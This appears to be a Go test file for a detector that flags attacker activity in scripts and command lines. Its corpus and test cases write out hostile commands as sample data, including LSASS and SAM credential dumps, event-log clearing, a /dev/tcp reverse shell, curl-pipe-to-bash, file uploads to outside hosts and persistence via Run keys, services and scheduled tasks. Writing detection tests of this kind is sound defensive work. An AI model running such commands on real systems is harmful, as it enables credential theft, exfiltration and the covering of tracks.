		"[Assembly]::Load($b)", "[AppDomain]::CurrentDomain.Load($b)", "$a.EntryPoint.Invoke($null, $null)",
		"[DllImport(\"k\")]", "VirtualAlloc", "[Marshal]::GetDelegateForFunctionPointer($p, $t)",
		"Add-Type -TypeDefinition $s", "New-Object Microsoft.CSharp.CSharpCodeProvider", "csc.exe /out:a.dll a.cs",
		"[Process]::Start($f)", "New-Object Diagnostics.ProcessStartInfo", "wmic process call create x", "Invoke-WmiMethod -Class Win32_Process -Name Create",
		"New-Object Net.Sockets.TcpClient($h, 443)", "var c = new TcpClient(h, 443);",
		"regsvr32 /s /i:u scrobj.dll", "mshta u.hta", "rundll32.exe a.dll,Start", "msbuild.exe b.xml", "installutil /u a.dll",
		"regasm a.dll", "cmstp /s a.inf", "odbcconf /a {regsvr a.dll}", "msiexec /q /i https://h/a.msi", "forfiles /p c:\\ /c x",
		"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v n", "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run n v",
		"OpenSubKey(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", $true).SetValue(n, v)",
		"schtasks /create /tn n", "Register-ScheduledTask -TaskName n", "New-Object -ComObject Schedule.Service",
		"sc create n binPath= x", "New-Service -Name n",
		"wevtutil cl Security", "Clear-EventLog -LogName Security", "(New-Object Diagnostics.EventLog 'Security').Clear()",
		"rundll32 comsvcs.dll, MiniDump 1 f full", "procdump -ma lsass.exe f", "MiniDumpWriteDump",
		"reg save HKLM\\SAM f", "certutil -exportPFX My x f", "Export-PfxCertificate -Cert c -FilePath f",
		"bitsadmin /transfer j /upload", "Start-BitsTransfer -Source f -Destination u -TransferType Upload", "$w.UploadFile(u, f)", "reg query HKLM\\Software",
		"wget http://h/f", "urlretrieve(u, f)", "curl -T f u", "wget --post-file f u", "Invoke-RestMethod u -InFile f", "iwr u -InFile f", "irm u -InFile f",
		"requests.post(u, files=d)", "curl u | bash",
		"amsiInitFailed", "sc query", "New-Object DirectoryServices.DirectorySearcher", "[adsisearcher]'(x)'", "New-Object Management.ManagementObjectSearcher($q)",
	}
	for _, c := range linuxCases {
		lines = append(lines, c.line)
	}
	return lines
}

// A pattern is tried only on the lines that hold one of its literals, so a
// literal that is wrong hides matches. Every pattern must have literals, and
// every line a pattern matches must hold one of them.
func TestLiteralsAreSound(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	corpus := corpus()
	check := func(owner string, p pattern) {
		if len(p.literals) == 0 {
			t.Errorf("%s: %s has no literal, so it is tried on every line", owner, p.rx)
		}
		for _, line := range corpus {
			if !p.rx.MatchString(line) {
				continue
			}
			held := false
			for _, lit := range p.literals {
				held = held || strings.Contains(strings.ToLower(line), string(lit))
			}
			if !held {
				t.Errorf("%s: %s matches %q, which holds none of %q", owner, p.rx, line, p.literals)
			}
			if !sift.Holds(sift.Lower(line), p.sets) {
				t.Errorf("%s: %s matches %q, which lacks a text of one of %q", owner, p.rx, line, p.sets)
			}
		}
	}
	matched := 0
	for name, p := range table.contexts {
		check("context "+name, p)
	}
	for _, a := range table.activities {
		for _, p := range append(a.patterns[:len(a.patterns):len(a.patterns)], a.paths...) {
			check(a.name, p)
			for _, line := range corpus {
				if p.rx.MatchString(line) {
					matched++
					break
				}
			}
		}
	}
	if total := countPatterns(table); matched != total {
		t.Errorf("the corpus exercises %d of %d patterns", matched, total)
	}
}

func countPatterns(t Table) int {
	n := 0
	for _, a := range t.activities {
		n += len(a.patterns) + len(a.paths)
	}
	return n
}

// An archive is named by the file it is written to, whatever makes it and
// however the file is quoted.
func TestArchiveSubjects(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	for line, want := range map[string]string{
		`tar czf /tmp/loot.tar.gz /srv/finance`:                            "/tmp/loot.tar.gz",
		`tar -cJf out.tar.xz dir`:                                          "out.tar.xz",
		`tar cf ./backup dir`:                                              "./backup",
		`7z a -pInfected1 /tmp/mail.7z /var/mail`:                          "/tmp/mail.7z",
		`& "C:\Program Files\7-Zip\7z.exe" a "C:\Temp\hr files.zip" C:\HR`: `C:\Temp\hr files.zip`,
		`zip -r /tmp/docs.zip /home/deploy/docs`:                           "/tmp/docs.zip",
		`rar a /tmp/hr.rar /srv/hr`:                                        "/tmp/hr.rar",
		`mysqldump crm | gzip > /tmp/crm.sql.gz`:                           "/tmp/crm.sql.gz",
		`makecab loot.txt loot.cab`:                                        "loot.cab",
		`Compress-Archive -Path C:\loot -DestinationPath 'C:\Temp\o.zip'`:  `C:\Temp\o.zip`,
		`shutil.make_archive("/tmp/out", "zip", "/srv")`:                   "/tmp/out",
		`tarfile.open("out.tar.bz2", "w:bz2")`:                             "out.tar.bz2",
	} {
		hits := table.Detect(line)
		if len(hits) != 1 || hits[0].Name != "ArchiveCreation" || len(hits[0].Evidence) != 1 {
			t.Errorf("Detect(%q) = %q, want ArchiveCreation alone on one line", line, names(hits))
			continue
		}
		var got []string
		for _, sub := range hits[0].Evidence[0].Subjects {
			if sub.Label == "archive" && !slices.Contains(got, sub.Value) {
				got = append(got, sub.Value)
			}
		}
		if !slices.Equal(got, []string{want}) {
			t.Errorf("Detect(%q) names the archives %q, want %q", line, got, want)
		}
	}
}

// A label that is listed with more than its value says what heads its
// column and which labels stand beside it; any other says nothing.
func TestShown(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	if got := table.Shown("task"); got.Column != "task name" || !slices.Equal(got.Beside, []string{"runs"}) || got.After {
		t.Errorf("Shown(task) = %+v; want the task name first, with what the task runs beside it", got)
	}
	if got := table.Shown("resource"); got.Column != "resource" || got.Beside != nil || !got.After {
		t.Errorf("Shown(resource) = %+v; want the resource after the activities that acted on it", got)
	}
	if got := table.Shown("archive"); got.Column != "" || got.Beside != nil || got.After {
		t.Errorf("Shown(archive) = %+v; want nothing", got)
	}
	labels := table.Labels()
	for _, want := range []string{"task", "runs", "account", "host", "url", "tenant"} {
		if n := len(slices.DeleteFunc(slices.Clone(labels), func(l string) bool { return l != want })); n != 1 {
			t.Errorf("Labels() names %q %d times, want once: %q", want, n, labels)
		}
	}
	one := func(labels string) string {
		return `{"contexts":{},"labels":` + labels + `,"activities":[{"name":"A","tactics":["Discovery"],"attack":["T1087"],"patterns":["abc"],` +
			`"subjects":[{"label":"task","pattern":"(abc)"},{"label":"runs","pattern":"(abc)"}]}]}`
	}
	if _, err := decode([]byte(one(`{"task":{"column":"task name","beside":["runs"]},"runs":{"column":"command","after":true}}`))); err != nil {
		t.Fatalf("a table with labels: %v", err)
	}
	for name, labels := range map[string]string{
		"a label of no subject":         `{"job":{"column":"job"}}`,
		"a label with no column":        `{"task":{"beside":["runs"]}}`,
		"a label that is only after":    `{"task":{"after":true}}`,
		"a label beside itself":         `{"task":{"column":"task name","beside":["task"]}}`,
		"a label beside one of nothing": `{"task":{"column":"task name","beside":["host"]}}`,
	} {
		if _, err := decode([]byte(one(labels))); err == nil {
			t.Errorf("%s: decode gave no error", name)
		}
	}
}

func TestRequired(t *testing.T) {
	tests := []struct {
		expr string
		want []string
	}{
		{`(?i)TeamsMessagesData`, []string{"teamsmessagesdata"}},
		{`(?i)\baz\s+keyvault\s+secret\s+(?:list|show)\b`, []string{"keyvault"}},
		{`(?i)\.get_secret\(|\blist_properties_of_secrets\(`, []string{".get_secret(", "list_properties_of_secrets("}},
		{`/(?:users|groups)\b`, []string{"users", "groups"}},
		{`(?:abc){2,}x`, []string{"abc"}},
		{`(?:abc)+`, []string{"abc"}},
		{`(abcd)`, []string{"abcd"}},
		{`(?:abc)*x`, nil},
		{`(?:abc){0,2}`, nil},
		{`abc|[0-9]+`, nil},
		{`ab|cd`, nil},
		{`\d+\.\d+`, nil},
		{`(?i)sécrets`, []string{"crets"}},
		{`(?i)-(?:EncodedCommand|enc)\s`, []string{"-enc"}},
	}
	for _, tt := range tests {
		t.Run(tt.expr, func(t *testing.T) {
			p, err := compile(tt.expr)
			if err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, lit := range p.literals {
				got = append(got, string(lit))
			}
			if !slices.Equal(got, tt.want) {
				t.Errorf("literals of %s = %q, want %q", tt.expr, got, tt.want)
			}
		})
	}
}

// untried is the table with no literal and no needed text, so that every
// pattern is tried on every line: what the search by literal must equal.
func untried(t Table) Table {
	bare := func(patterns []pattern) []pattern {
		out := make([]pattern, len(patterns))
		for i, p := range patterns {
			out[i] = pattern{rx: p.rx}
		}
		return out
	}
	plain := Table{contexts: map[string]pattern{}}
	for name, p := range t.contexts {
		plain.contexts[name] = pattern{rx: p.rx}
	}
	for _, a := range t.activities {
		a.patterns, a.paths = bare(a.patterns), bare(a.paths)
		plain.activities = append(plain.activities, a)
	}
	return plain
}

// Trying a pattern only on the lines that hold its texts finds what trying
// it on every line finds, in a small text, a large one and one that folds.
func TestDetectByLiteralEqualsEveryLine(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	plain := untried(table)
	lines := strings.Join(corpus(), "\n") + "\n"
	for _, tt := range []struct{ name, text string }{
		{"the corpus", lines},
		{"a large text", strings.Repeat(lines, 1+small/len(lines))},
		{"upper case", strings.ToUpper(lines)},
		{"a letter that folds", lines + "\u212aubectl get \u017fecrets\ncurl http://h/f | ba\u017fh\n"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			got, want := table.Detect(tt.text), plain.Detect(tt.text)
			if len(want) < 20 {
				t.Fatalf("every line shows %d activities: the text does not try the literals", len(want))
			}
			if !reflect.DeepEqual(got, want) {
				t.Errorf("by literal: %d activities, every line: %d; the two differ", len(got), len(want))
			}
		})
	}
}

func TestDetectWithoutLiterals(t *testing.T) {
	table, err := decode([]byte(`{"contexts":{"numbered":"^[0-9]+ "},"activities":[
		{"name":"Versioned","tactics":["T"],"attack":["X"],"patterns":["\\d+\\.\\d+\\.\\d+"],"unless":"skip"},
		{"name":"Dated","tactics":["T"],"attack":["X"],"context":"numbered","paths":["\\d{4}-\\d{2}"]}]}`))
	if err != nil {
		t.Fatal(err)
	}
	hits := table.Detect("1 release 1.2.3\n\nskip 4.5.6\n7.8.9 and 2026-10\nplain\n")
	if len(hits) != 2 || hits[0].Name != "Versioned" || hits[0].Lines != 2 || hits[1].Name != "Dated" || hits[1].Lines != 1 {
		t.Errorf("hits = %+v, want Versioned on 2 lines and Dated on 1", hits)
	}
	if hits := table.Detect("release 1.2.3 on 2026-10\n"); len(hits) != 1 {
		t.Errorf("hits = %+v, want Versioned alone outside the context", hits)
	}
}

// subjectsOf gives the subjects of the first evidence line of the named activity.
func subjectsOf(hits []Hit, name string) []Subject {
	for _, h := range hits {
		if h.Name == name && len(h.Evidence) > 0 {
			return h.Evidence[0].Subjects
		}
	}
	return nil
}

// An activity says what it acted on: the account, the file, the host.
func TestDetectSubjects(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		activity string
		text     string
		want     []Subject
	}{
		{"AccountCreation", `useradd -m -s /bin/bash svc`, []Subject{{"account", "svc"}}},
		{"AccountCreation", `net user helper "$P" /add`, []Subject{{"account", "helper"}}},
		{"AccountCreation", `New-LocalUser -Name "helper" -NoPassword`, []Subject{{"account", "helper"}}},
		{"SystemdUnitCreation", `systemctl enable --now sync.service`, []Subject{{"unit", "sync.service"}}},
		{"ScheduledJobCreation", `echo "$JOB" >> /etc/cron.d/sync`, []Subject{{"job file", "/etc/cron.d/sync"}, {"runs", "$JOB"}}},
		{"ScheduledJobCreation", "JOB='* * * * * /tmp/t'\n(crontab -l; echo \"$JOB\") | crontab -", []Subject{{"runs", "* * * * * /tmp/t ($JOB)"}}},
		{"SshKeyPersistence", `echo "$KEY" >> ~/.ssh/authorized_keys`, []Subject{{"file", "~/.ssh/authorized_keys"}}},
		{"SudoersModification", `echo "$RULE" >> /etc/sudoers.d/svc`, []Subject{{"file", "/etc/sudoers.d/svc"}, {"rule", "$RULE"}}},
		{"SetuidBit", "F=/tmp/tool\nchmod u+s \"$F\"", []Subject{{"file", "/tmp/tool ($F)"}}},
		{"LogDeletion", `rm -f /var/log/auth.log`, []Subject{{"log", "/var/log/auth.log"}}},
		{"SecurityToolDisabling", `systemctl stop auditd`, []Subject{{"service", "auditd"}}},
		{"ReverseShell", "H=203.0.113.41\nexec 3<>/dev/tcp/$H/$PORT", []Subject{{"host", "203.0.113.41 ($H)"}, {"port", "$PORT"}}},
		{"FileUpload", `curl -T out.tgz https://files.example.net/up`, []Subject{{"url", "https://files.example.net/up"}, {"file", "out.tgz"}}},
		{"FileDownload", `certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\c.exe`, []Subject{{"url", "http://203.0.113.10/c.exe"}}},
		{"ScheduledTaskCreation", `schtasks /create /tn Updater /tr "rundll32.exe C:\a.dll,Start" /sc onlogon`, []Subject{{"task", "Updater"}, {"runs", `rundll32.exe C:\a.dll,Start`}}},
		{"RunKeyPersistence", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "c:\a.exe"`, []Subject{{"value", "Updater"}, {"runs", `c:\a.exe`}}},
		{"ServiceCreation", `sc.exe \\dc01 create Upd binPath= c:\a.exe`, []Subject{{"service", "Upd"}, {"runs", `c:\a.exe`}, {"host", "dc01"}}},
		{"EventLogClearing", `wevtutil cl Security`, []Subject{{"log", "Security"}}},
		{"KeyVaultSecretRead", `curl -s "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4"`, []Subject{{"vault", "corpvault"}, {"secret", "db-password"}}},
		{"TokenRequest", "$TENANT = '11111111-2222-4333-8444-555555555555'\naz login --service-principal -u app1 -p $S --tenant $TENANT", []Subject{{"tenant", "11111111-2222-4333-8444-555555555555 ($TENANT)"}, {"client", "app1"}}},
		{"HistoryClearing", `history -c`, nil},
	}
	for _, tt := range tests {
		t.Run(tt.text, func(t *testing.T) {
			if got := subjectsOf(table.Detect(tt.text), tt.activity); !slices.Equal(got, tt.want) {
				t.Errorf("subjects of %s = %v, want %v", tt.activity, got, tt.want)
			}
		})
	}
}

// A subject is listed plain without the name of the variable that held it,
// and as it stands where no variable did.
func TestSubjectPlain(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	held := subjectsOf(table.Detect("H=203.0.113.41\nexec 3<>/dev/tcp/$H/$PORT"), "ReverseShell")
	if len(held) != 2 || held[0].Plain() != "203.0.113.41" || held[1].Plain() != "$PORT" {
		t.Errorf("the subjects %v are plain %q, want the value of $H and $PORT as it stands", held, []string{held[0].Plain(), held[1].Plain()})
	}
	for value, want := range map[string]string{
		"svc": "svc", "/tmp/tool ($F)": "/tmp/tool", "c:\\a.exe (%TOOL%)": "c:\\a.exe", "svc_backup (${AD_USER:-svc_backup})": "svc_backup",
		"Program Files (x86)": "Program Files (x86)", "notes (final)": "notes (final)", "($F)": "($F)", "": "",
	} {
		if got := (Subject{Label: "file", Value: value}).Plain(); got != want {
			t.Errorf("Plain of %q = %q, want %q", value, got, want)
		}
	}
}

// Evidence names the line as it stands in the file, even after a command
// that is continued over lines, and keeps a bounded number of bounded lines.
func TestDetectEvidence(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	text := "#!/bin/bash\ncurl -s \\\n  -T out.tgz \\\n  https://files.example.net/up\n\n   history   -c  \n"
	hits := table.Detect(text)
	if got := names(hits); !slices.Equal(got, []string{"FileUpload", "HistoryClearing"}) {
		t.Fatalf("activities = %q", got)
	}
	if e := hits[0].Evidence; len(e) != 1 || e[0].Line != 2 || e[0].Last != 4 || e[0].Text != "curl -s -T out.tgz https://files.example.net/up" {
		t.Errorf("a continued command: evidence = %+v, want lines 2 to 4 joined and trimmed", e)
	}
	if e := hits[1].Evidence; len(e) != 1 || e[0].Line != 6 || e[0].Last != 0 || e[0].Text != "history -c" {
		t.Errorf("a line after a continued command: evidence = %+v, want line 6 alone", e)
	}
	if e := table.Detect("Invoke-WebRequest `\r\n  -Uri http://203.0.113.10/a.exe `\r\n  -OutFile a.exe\r\n")[0].Evidence; len(e) != 1 || e[0].Line != 1 || e[0].Last != 3 {
		t.Errorf("a command of PowerShell continued over lines: evidence = %+v, want lines 1 to 3", e)
	}
	var many strings.Builder
	for range maxEvidence + 5 {
		many.WriteString("history -c # " + strings.Repeat("é", maxText) + "\n")
	}
	hits = table.Detect(many.String())
	if len(hits) != 1 || hits[0].Lines != maxEvidence+5 || len(hits[0].Evidence) != maxEvidence {
		t.Fatalf("many lines: %d lines counted and %d kept, want %d and %d", hits[0].Lines, len(hits[0].Evidence), maxEvidence+5, maxEvidence)
	}
	last := hits[0].Evidence[maxEvidence-1]
	if last.Line != maxEvidence || len(last.Text) > maxText || !strings.HasSuffix(last.Text, ellipsis) || !utf8.ValidString(last.Text) {
		t.Errorf("a long line: line %d, %d bytes, %q", last.Line, len(last.Text), last.Text[len(last.Text)-8:])
	}
}
